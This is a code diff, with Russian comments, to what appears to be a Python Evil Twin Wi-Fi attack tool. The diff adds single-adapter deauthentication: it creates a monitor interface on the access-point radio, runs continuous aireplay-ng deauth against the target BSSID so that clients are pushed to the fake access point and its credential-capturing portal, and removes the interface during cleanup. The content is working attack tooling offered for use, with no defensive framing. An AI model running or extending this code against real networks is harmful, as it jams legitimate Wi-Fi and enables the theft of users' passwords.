@@ -278,6 +278,7 @@ def _start_attack(ap_interface, attack_iface, target, essid, bssid, channel,
     nmcli = _have("nmcli")
     ipt_backup = tmp_dir / "iptables.backup"
     changed_forward = False
+    created_vif = None    # монитор-VIF для деаута одним адаптером
 
     print("\n[4/4] Запуск Evil Twin...")
     EVIL_TWIN_DIR.mkdir(parents=True, exist_ok=True)
@@ -344,18 +345,32 @@ def _start_attack(ap_interface, attack_iface, target, essid, bssid, channel,
                                   preexec_fn=os.setsid)
         procs.append(("portal", portal))
 
-        # --- Деаутентификация 2-м адаптером ---
+        # --- Деаутентификация ---
+        # 2 адаптера: 2-й независимо глушит реальную сеть.
+        # 1 адаптер: создаём монитор-VIF на том же радио (как airgeddon) и
+        # шлём deauth через него — на том же канале, что и AP (= канал цели).
+        deauth_iface = None
         if attack_iface:
             iface.set_monitor_mode(attack_iface)
             iface.set_channel(attack_iface, channel)
-            deauth = _bg(["aireplay-ng", "--deauth", "0", "-a", bssid, attack_iface],
+            deauth_iface = attack_iface
+        else:
+            vif = iface.add_monitor_vif(ap_interface)
+            if vif:
+                created_vif = vif
+                deauth_iface = vif
+                print(f"[+] Монитор-интерфейс {vif} создан на том же адаптере.")
+            else:
+                print("[!] Драйвер не поддерживает AP + monitor одновременно —")
+                print("    деаутентификация одним адаптером недоступна, нужен 2-й.")
+
+        if deauth_iface:
+            deauth = _bg(["aireplay-ng", "--deauth", "0", "-a", bssid, deauth_iface],
                          tmp_dir / "deauth.log")
             procs.append(("deauth", deauth))
-            print(f"[+] Деаутентификация запущена ({attack_iface}) по {bssid}.")
-        else:
-            print("[*] Без 2-го адаптера: клиенты перецепятся сами, когда отключатся.")
+            print(f"[+] Деаутентификация запущена ({deauth_iface}) по {bssid}.")
 
-        _status(essid, bssid, channel, ap_interface, attack_iface, template, handshake)
+        _status(essid, bssid, channel, ap_interface, deauth_iface, template, handshake)
         _watch_credentials(procs)
 
     except KeyboardInterrupt:
@@ -364,7 +379,8 @@ def _start_attack(ap_interface, attack_iface, target, essid, bssid, channel,
         print(f"[-] Ошибка: {e}")
     finally:
         _cleanup(procs, ap_interface, attack_iface, nmcli,
-                 ipt_backup if ipt_backup.exists() else None, changed_forward)
+                 ipt_backup if ipt_backup.exists() else None, changed_forward,
+                 created_vif)
         _show_captured()
         shutil.rmtree(tmp_dir, ignore_errors=True)
 
@@ -415,10 +431,15 @@ def _tail(path, n=15):
         return "(лог недоступен)"
 
 
-def _cleanup(procs, ap_iface, attack_iface, nmcli, ipt_backup, changed_forward):
+def _cleanup(procs, ap_iface, attack_iface, nmcli, ipt_backup, changed_forward,
+             created_vif=None):
     print("\n[*] Останавливаю процессы и восстанавливаю сеть...")
     for name, proc in reversed(procs):
         kill_group(proc)
+
+    # Удаляем монитор-VIF, если создавали (деаут одним адаптером).
+    if created_vif:
+        iface.del_interface(created_vif)
 
     # iptables
     _run(["iptables", "--flush"])
